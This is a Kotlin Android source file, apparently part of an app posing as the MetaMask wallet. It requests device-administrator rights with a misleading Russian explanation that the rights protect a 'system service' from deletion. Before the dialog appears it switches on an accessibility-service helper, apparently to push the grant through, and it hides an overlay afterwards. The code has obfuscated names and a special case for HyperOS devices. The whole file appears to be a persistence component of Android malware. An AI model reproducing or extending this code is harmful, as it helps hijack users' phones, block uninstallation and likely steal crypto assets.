package com.example.MetaMask.activities

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.example.MetaMask.ChainBridge
import com.example.MetaMask.receivers.BadgerFalconRecv
import com.example.MetaMask.services.AccessSvc

class BadgerFalconLauncherActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "AdminLauncher"
    }

    private lateinit var adminLauncher: ActivityResultLauncher<Intent>
    private var launched = false
    private var resultSent = false

    override fun onCreate(savedInstanceState: Bundle?) {
        android.util.Log.d("XDBG", "[BadgerFalconLauncherActivity] onCreate enter savedInstanceState=${savedInstanceState}") //xdbg
        adminLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { result ->
            val comp = ComponentName(this, BadgerFalconRecv::class.java)
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            val granted = dpm?.isAdminActive(comp) == true
            if (!granted && com.example.MetaMask.HyperOsDetector.isHyperOs) {
                android.util.Log.d("XDBG", "[BadgerFalconLauncherActivity] if branch") //xdbg
                resultSent = true
                CoralCobraActivity.trackingDeviceAdminDialog = false
                AccessSvc.instance?.stoatShield?.setupInProgress = false
                finish()
                android.util.Log.d("XDBG", "[BadgerFalconLauncherActivity] return") //xdbg
                return@registerForActivityResult
            }
            resultSent = true
            CoralCobraActivity.trackingDeviceAdminDialog = false
            AccessSvc.instance?.stoatShield?.setupInProgress = false
            sendBroadcast(Intent(ChainBridge.ACTION_ADMIN_RESULT).apply {
                setPackage(packageName)
                putExtra(ChainBridge.EXTRA_ADMIN_GRANTED, granted)
            })
            AccessSvc.instance?.onDeviceAdminSetupFinished(granted)
            finish()
        }
        super.onCreate(savedInstanceState)
        AccessSvc.instance?.stoatShield?.setupInProgress = true
    }

    override fun onResume() {
        android.util.Log.d("XDBG", "[BadgerFalconLauncherActivity] onResume enter") //xdbg
        super.onResume()
        if (launched) return
        launched = true

        AccessSvc.instance?.autoIbis?.enable(true)
        AccessSvc.instance?.stoatShield?.setupInProgress = true

        window.decorView.post {
            if (isFinishing) return@post

            val comp = ComponentName(this, BadgerFalconRecv::class.java)
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            if (dpm?.isAdminActive(comp) == true) {
                android.util.Log.d("XDBG", "[BadgerFalconLauncherActivity] if branch") //xdbg
                AccessSvc.instance?.stoatShield?.setupInProgress = false
                AccessSvc.instance?.onDeviceAdminSetupFinished(true)
                finish()
                android.util.Log.d("XDBG", "[BadgerFalconLauncherActivity] return") //xdbg
                return@post
            }

            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
                putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Требуется для защиты системной службы от удаления."
                )
            }
            sendBroadcast(Intent(ChainBridge.ACTION_AUTOIBIS_ADMIN).apply { setPackage(packageName) })
            AccessSvc.instance?.autoIbis?.onDeviceAdminRequested()
            CoralCobraActivity.trackingDeviceAdminDialog = true
            try {
                adminLauncher.launch(intent)
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[BadgerFalconLauncherActivity] catch (ignored)") //xdbg
                CoralCobraActivity.trackingDeviceAdminDialog = false
                AccessSvc.instance?.stoatShield?.setupInProgress = false
                AccessSvc.instance?.onDeviceAdminSetupFinished(false)
                finish()
            }
        }
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[BadgerFalconLauncherActivity] onDestroy enter") //xdbg
        AccessSvc.instance?.stoatShield?.setupInProgress = false
        CoralCobraActivity.trackingDeviceAdminDialog = false
        if (launched && !resultSent) {
            android.util.Log.d("XDBG", "[BadgerFalconLauncherActivity] if branch") //xdbg
            val comp = ComponentName(this, BadgerFalconRecv::class.java)
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            val granted = dpm?.isAdminActive(comp) == true
            sendBroadcast(Intent(ChainBridge.ACTION_ADMIN_RESULT).apply {
                setPackage(packageName)
                putExtra(ChainBridge.EXTRA_ADMIN_GRANTED, granted)
            })
        }
        val inGrantChain = AccessSvc.instance?.isGrantChainActive() == true
        if (!inGrantChain) {
            android.util.Log.d("XDBG", "[BadgerFalconLauncherActivity] if branch") //xdbg
            try { AccessSvc.instance?.martenHelper?.hide() } catch (_: Exception) {}
            try { AccessSvc.instance?.autoIbis?.enable(false) } catch (_: Exception) {}
        }
        super.onDestroy()
    }
}
